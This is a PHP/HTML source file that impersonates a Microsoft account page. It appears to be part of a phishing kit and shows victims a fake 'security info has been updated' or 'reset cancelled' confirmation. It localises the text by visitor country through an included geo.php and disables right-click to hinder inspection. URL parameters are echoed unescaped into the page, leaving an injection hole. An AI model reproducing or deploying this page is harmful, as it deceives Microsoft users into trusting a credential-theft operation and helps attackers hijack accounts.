<?php
session_start();
ob_start();
include "geo.php";
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_GET['userid'];
// start > to get url and and put id 
	
$subemail = $_GET['subemail'];
$radiobtn = $_GET['radiobtn'];

include "langLib.php";
?>

<!DOCTYPE html>
<html lang="en" xml:lang="en" class="m_ul" dir="ltr" style="">
  <head>

    <title>Microsoft account</title>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"/><meta name="format-detection" content="telephone=no"/>
    <link rel="icon" href="/netease/assets/images/favicon.ico?v=2" type="image/x-icon" />
    

    
    <style type="text/css">body{display:block;}</style>
    
   
   
    <link href="/netease/assets/msa_wrTKunQ4zSdj0K9xOU4qBg2.css?v=1" rel="stylesheet" />

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>
$(document).ready(function(){
    var radiobtn = "<?php echo $radiobtn ?>";
    if (radiobtn == "removeProof"){
        $("#Cancel").hide();
    }else  if(radiobtn =="keepProof"){
  
    $("#Finish").hide();
    }else{
        $("#Finish").hide();
    }
 
 //check country language
  var country ="<?php echo $country ?>";
   if (country=="DE"){
       $("#site-identifier").html("<?php echo $identifierDe; ?>");
       $('#c_csigninsignout').html("<?php echo $signinDe ; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleDe ; ?>");
       $('#pageDesc').html("<?php echo $pageDescDe ; ?>");
       $('#textbase').html("<?php echo $textbaseDe ; ?>");
       $('#base').html("<?php echo $baseDe ; ?>");
        $('#proofbase').html("<?php echo $proofbaseDe ; ?>");
         $('#proof').html("<?php echo $proofDe ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1De; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2De; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersDe ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langDe ; ?>");
       $('#StartAction').val ("<?php echo $StartActionDe ; ?>");
       $('#finishTitle').html("<?php echo $iFinishTitleDe ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleDe ; ?>");
       $('#noChanges').html("<?php echo $noChangesDe ; ?>");
       $('#changesMade').html("<?php echo $changesMadeDe ; ?>");
       
   }
    else if ((country=="CN") || (country =="TW") || (country == "HK")){
       $('#site-identifier').html("<?php echo $identifierCn; ?>");
       $('#c_csigninsignout').html("<?php echo $signinCn; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleCn ; ?>");
       $('#pageDesc').html("<?php echo $pageDescCn ; ?>");
       $('#textbase').html("<?php echo $textbaseCn ; ?>");
       $('#base').html("<?php echo $baseCn ; ?>");
       $('#proofbase').html("<?php echo $proofbaseCn ; ?>");
       $('#proof').html("<?php echo $proofCn ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Cn; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Cn; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersCn ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langCn ; ?>");
       $('#StartAction').val ("<?php echo $StartActionCn ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleCn ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleCn ; ?>");
       $('#noChanges').html("<?php echo $noChangesCn ; ?>");
       $('#changesMade').html("<?php echo $changesMadeCn ; ?>");
       
   }
    else if (country=="KR"){
       $('#site-identifier').html("<?php echo $identifierKr; ?>");
       $('#c_csigninsignout').html("<?php echo $signinKr; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleKr ; ?>");
       $('#pageDesc').html("<?php echo $pageDescKr ; ?>");
       $('#textbase').html("<?php echo $textbaseKr ; ?>");
       $('#base').html("<?php echo $baseKr ; ?>");
       $('#proofbase').html("<?php echo $proofbaseKr ; ?>");
       $('#proof').html("<?php echo $proofKr ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Kr; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Kr; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersKr ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langKr ; ?>");
       $('#StartAction').val("<?php echo $StartActionKr ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleKr ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleKr ; ?>");
       $('#noChanges').html("<?php echo $noChangesKr ; ?>");
       $('#changesMade').html("<?php echo $changesMadeKr ; ?>");
       
   }
    else if (country=="JP"){
       $('#site-identifier').html("<?php echo $identifierJp; ?>");
       $('#c_csigninsignout').html("<?php echo $signinJp; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleJp ; ?>");
       $('#pageDesc').html("<?php echo $pageDescJp ; ?>");
       $('#textbase').html("<?php echo $textbaseJp ; ?>");
       $('#base').html("<?php echo $baseJp ; ?>");
        $('#proofbase').html("<?php echo $proofbaseJp ; ?>");
        $('#proof').html("<?php echo $proofJp ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Jp; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Jp; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersJp ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langJp ; ?>");
       $('#StartAction').val("<?php echo $StartActionJp ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleJp ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleJp ; ?>");
       $('#noChanges').html("<?php echo $noChangesJp ; ?>");
       $('#changesMade').html("<?php echo $changesMadeJp ; ?>");
   }
    else if (country=="TR"){
       $('#site-identifier').html("<?php echo $identifierTr; ?>");
       $('#c_csigninsignout').html("<?php echo $signinTr; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleTr ; ?>");
       $('#pageDesc').html("<?php echo $pageDescTr ; ?>");
       $('#textbase').html("<?php echo $textbaseTr ; ?>");
       $('#base').html("<?php echo $baseTr ; ?>");
        $('#proofbase').html("<?php echo $proofbaseTr ; ?>");
        $('#proof').html("<?php echo $proofTr ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Tr; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Tr; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersTr ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langTr ; ?>");
       $('#StartAction').val("<?php echo $StartActionTr ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleTr ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleTr ; ?>");
       $('#noChanges').html("<?php echo $noChangesTr ; ?>");
       $('#changesMade').html("<?php echo $changesMadeTr ; ?>");
   }
    else if (country=="RU"){
       $('#site-identifier').html("<?php echo $identifierRu; ?>");
       $('#c_csigninsignout').html("<?php echo $signinRu; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleRu ; ?>");
       $('#pageDesc').html("<?php echo $pageDescRu ; ?>");
       $('#textbase').html("<?php echo $textbaseRu ; ?>");
       $('#base').html("<?php echo $baseRu ; ?>");
        $('#proofbase').html("<?php echo $proofbaseRu ; ?>");
        $('#proof').html("<?php echo $proofRu ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Ru; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Ru; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersRu ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langRu ; ?>");
       $('#StartAction').val("<?php echo $StartActionRu ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleRu ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleRu ; ?>");
       $('#noChanges').html("<?php echo $noChangesRu ; ?>");
       $('#changesMade').html("<?php echo $changesMadeRu ; ?>");
   }
    else if ((country=="ES") || (country=="BR")){
       $('#site-identifier').html("<?php echo $identifierEs; ?>");
       $('#c_csigninsignout').html("<?php echo $signinEs; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleEs ; ?>");
       $('#pageDesc').html("<?php echo $pageDescEs ; ?>");
       $('#textbase').html("<?php echo $textbaseEs ; ?>");
       $('#base').html("<?php echo $baseEs ; ?>");
        $('#proofbase').html("<?php echo $proofbaseEs ; ?>");
        $('#proof').html("<?php echo $proofEs ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Es; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Es; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersEs ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langEs ; ?>");
       $('#StartAction').val("<?php echo $StartActionEs ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleEs ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleEs ; ?>");
       $('#noChanges').html("<?php echo $noChangesEs ; ?>");
       $('#changesMade').html("<?php echo $changesMadeEs ; ?>");
       
   } 
   else if (country=="VN"){
       $('#site-identifier').html("<?php echo $identifierVn; ?>");
       $('#c_csigninsignout').html("<?php echo $signinVn; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleVn ; ?>");
       $('#pageDesc').html("<?php echo $pageDescVn ; ?>");
       $('#textbase').html("<?php echo $textbaseVn ; ?>");
       $('#base').html("<?php echo $baseVn ; ?>");
        $('#proofbase').html("<?php echo $proofbaseVn ; ?>");
        $('#proof').html("<?php echo $proofVn ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Vn; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Vn; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersVn ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langVn ; ?>");
       $('#StartAction').val("<?php echo $StartActionVn ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleVn ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleVn ; ?>");
       $('#noChanges').html("<?php echo $noChangesVn ; ?>");
       $('#changesMade').html("<?php echo $changesMadeVn ; ?>");
       
   } else if (country=="ID"){
       $('#site-identifier').html("<?php echo $identifierId; ?>");
       $('#c_csigninsignout').html("<?php echo $signinId; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleId ; ?>");
       $('#pageDesc').html("<?php echo $pageDescId ; ?>");
       $('#textbase').html("<?php echo $textbaseId ; ?>");
       $('#base').html("<?php echo $baseId ; ?>");
        $('#proofbase').html("<?php echo $proofbaseId ; ?>");
        $('#proof').html("<?php echo $proofId ; ?>");
        $('#uxp_ftr_link_legal').html("<?php echo $f1Id; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Id; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersId ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langId ; ?>");
       $('#StartAction').val("<?php echo $StartActionId ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleId ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleId ; ?>");
       $('#noChanges').html("<?php echo $noChangesId ; ?>");
       $('#changesMade').html("<?php echo $changesMadeId ; ?>");
   }
    else if (country=="IT"){
       $('#site-identifier').html("<?php echo $identifierIt; ?>");
       $('#c_csigninsignout').html("<?php echo $signinIt; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleIt ; ?>");
       $('#pageDesc').html("<?php echo $pageDescIt ; ?>");
       $('#textbase').html("<?php echo $textbaseIt ; ?>");
       $('#base').html("<?php echo $baseIt ; ?>");
        $('#proofbase').html("<?php echo $proofbaseIt ; ?>");
        $('#proof').html("<?php echo $proofIt ; ?>");
        $('#uxp_ftr_link_legal').html("<?php echo $f1It; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2It; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersIt ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langIt ; ?>");
       $('#StartAction').val("<?php echo $StartActionIt ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleIt ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleIt ; ?>");
       $('#noChanges').html("<?php echo $noChangesIt ; ?>");
       $('#changesMade').html("<?php echo $changesMadeIt ; ?>");
   }
    else if ((country=="AE") || (country=="IR") || (country =="IQ") || (country=="EG")){
       $('#site-identifier').html("<?php echo $identifierAe; ?>");
       $('#c_csigninsignout').html("<?php echo $signinAe; ?>");
      $('#iStartTitle').html("<?php echo $iStartTitleAe ; ?>");
      $('#pageDesc').html("<?php echo $pageDescAe ; ?>");
      $('#textbase').html("<?php echo $textbaseAe ; ?>");
      $('#base').html("<?php echo $baseAe ; ?>");
       $('#proofbase').html("<?php echo $proofbaseAe ; ?>");
       $('#proof').html("<?php echo $proofAe ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Ae; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Ae; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersAe ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langAe ; ?>");
       $('#StartAction').val("<?php echo $StartActionAe ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleAe ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleAe ; ?>");
       $('#noChanges').html("<?php echo $noChangesAe ; ?>");
       $('#changesMade').html("<?php echo $changesMadeAe ; ?>");
   }
    else if (country=="TH"){
       $('#site-identifier').html("<?php echo $identifierTh; ?>");
       $('#c_csigninsignout').html("<?php echo $signinTh; ?>");
       $('#iStartTitle').html("<?php echo $iStartTitleTh ; ?>");
       $('#pageDesc').html("<?php echo $pageDescTh ; ?>");
       $('#textbase').html("<?php echo $textbaseTh ; ?>");
       $('#base').html("<?php echo $baseTh ; ?>");
        $('#proofbase').html("<?php echo $proofbaseTh ; ?>");
        $('#proof').html("<?php echo $proofTh ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1Th; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2Th; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersTh ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langTh ; ?>");
       $('#StartAction').val("<?php echo $StartActionTh ; ?>");
        $('#finishTitle').html("<?php echo $iFinishTitleTh ; ?>");
       $('#iCancelTitle').html("<?php echo $iCancelTitleTh ; ?>");
       $('#noChanges').html("<?php echo $noChangesTh ; ?>");
       $('#changesMade').html("<?php echo $changesMadeTh ; ?>");
   }
    else {
       $('#site-identifier').html("<?php echo $identifierEn; ?>");
       $('#c_csigninsignout').html("<?php echo $signinEn; ?>");
      $('#iStartTitle').html("<?php echo $iStartTitleEn ; ?>");
      $('#pageDesc').html("<?php echo $pageDescEn ; ?>");
      $('#textbase').html("<?php echo $textbaseEn ; ?>");
      $('#base').html("<?php echo $baseEn ; ?>");
       $('#proofbase').html("<?php echo $proofbaseEn ; ?>");
       $('#proof').html("<?php echo $proofEn ; ?>");
       $('#uxp_ftr_link_legal').html("<?php echo $f1En; ?>");
       $('#uxp_ftr_link_privacy').html("<?php echo $f2En; ?>");
       $('#uxp_ftr_link_developers').html("<?php echo $developersEn ; ?>");
       $('#uxp_ftr_link_lang').html("<?php echo $langEn ; ?>");
       $('#StartAction').val("<?php echo $StartActionEn ; ?>");
        $('#finishTitle').val("<?php echo $iFinishTitleEn ; ?>");
       $('#iCancelTitle').val("<?php echo $iCancelTitleEn ; ?>");
       $('#noChanges').html("<?php echo $noChangesEn ; ?>");
       $('#changesMade').html("<?php echo $changesMadeEn ; ?>");
       
   }
   
   //alert(country);
  
});
</script>
    
    	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>

    

    

    
    
  </head>

  <body style="" class="ltr  Chrome _Win _M70 _D0 Full RE_WebKit" lang="en-US">
        <div class="App" id="iPageElt">  
  

        
        <div id="m_wh">
            

<div role="banner" id="c_header" class="c_hb c_hncb">
    <div class="c_c t_hdbg c_cd c_c8 c_clt" id="c_cb0" style="overflow: visible;">
        <!-- Fallback header logo -->
        <div class="c_clogo c_clogoni" style="min-width: 170px;">
            <div>
                <a title="" class="c_clogot" id="c_clogot" onclick="" href="/" aria-label="Microsoft account" >
                    <img src="/netease/assets/images/ms-logo-v2_XshpB8GsXvPhF3I5mP64vg2.jpg" aria-hidden="true">
                    <span id="site-identifier" aria-hidden="true">Account</span>
                </a>
            </div>
        </div>
        <!-- Fallback header Signin/Signout link -->
        <div id="c_cme" class="c_cme">
            <a id="c_csigninsignout" href="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1543119726&rver=6.7.6655.0&wp=SAPI&wreply=https%3A%2F%2Faccount.live.com%2FSummaryPage.aspx%3Fuaid%3D0cb55c782ddb4271be5b6c7e10169ba3&lc=1033&id=38936&mkt=en-US&uaid=0cb55c782ddb4271be5b6c7e10169ba3">Sign in</a>
        </div>
    </div>
</div>

        </div>
        


                </div>
                <div role="main" class="c_inmiddle_area" id="dynamiccontent" style="display:block" aria-hidden="true" spellcheck="false">
                    
    <div id="disconnectProofTemplates" style="display:block">
 
        <!-- Finish page -->
        <div id="Finish">
            <section class="section">
                <div id="iFinishTitle" class="text-subheader" role="heading"  data-bind="text: pageTitle"><span id="finishTitle">Reset instruction cancelled for microsoft account</span>&nbsp;&nbsp; <?php echo $email ?></div>
                <div class="section-body container">
                    <div class="row">
                        <div id ="changesMade" class="col-xs-24 text-body" data-bind="text: pageDescription">You should no longer receive notifications about this Microsoft account.</div>
                    </div> 
                </div>
            </section>
        </div>
      
        <!-- Cancel page -->
        <div id="Cancel">
            <section class="section">
                <div id="iCancelTitle" class="text-subheader" role="heading"  data-bind="text: pageTitle">No changes were made</div>
                <div class="section-body container">
                    <div class="row">
                        <div  class="col-xs-24 text-body" style="display:block" data-bind="text: pageDescription"><?php echo $email ?> <span id="noChanges">security info has been updated!</span></div>
                    </div> 
                </div>
            </section>
        </div>
        <!-- Error page -->
        <div id="Error" style="display:none">
            <section class="section">
                <div id="iErrorTile" class="text-subheader" role="heading" style="display:none" data-bind="text: pageTitle">That link has already expired or is incorrect</div>
            </section>
        </div>
    </div>

         
                </div>
                <div role="main" class="c_inmiddle_area" id="dynamiccontent1" style="display:none" aria-hidden="true" spellcheck="false">
                    
                </div>
            </div>
            <div class="ClearFloat"></div>
        
        
                    

            
                <div id="m_wf" class="m_wfp">
                

<div id="uxp_ftr_ctr" role="contentinfo">
    <div>
        <div id="uxp_ftr_modal_language" class="modal fade" tabindex="-1" role="dialog" aria-label="English&#32;(United&#32;States)" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4>Language</h4>
                    </div>
                    <form name="langPicker" action="/handlers/languagesave.mvc" method="POST">
                    <div class="modal-body">
                        We&#39;re unable to display the list of languages at this time.
                    </div>
                    </form>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary">Save</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="uxp_ftr_items" class="col-xs-24">
            <div class="pull-right">
                

                <span id="uxp_ftr_link_trademark">&copy; 2018 Microsoft</span>

                <span><a id="uxp_ftr_link_legal" target="_top" tabindex="0" href="https://www.microsoft.com/en-us/servicesagreement/default.aspx" aria-label='Microsoft Terms of Use'>Terms of Use</a></span>
                <span><a id="uxp_ftr_link_privacy" target="_top" tabindex="0" href="https://go.microsoft.com/fwlink/?LinkID=521839" aria-label='Microsoft Privacy &amp; Cookies statement'>Privacy & Cookies</a></span>

                
                <span>
                    <a id="uxp_ftr_link_developers" target="_top" href="https://go.microsoft.com/fwlink/?LinkId=286660">Developers</a>
                </span>
                
                <span>
                    <a id="uxp_ftr_link_lang" data-toggle="modal" href="#uxp_ftr_modal_language">English (United States)</a>
                </span>
                
            </div>
        </div>
    </div>
</div>

</div>
            
        </div>
    </div></div>
    

    </body>
  
</html>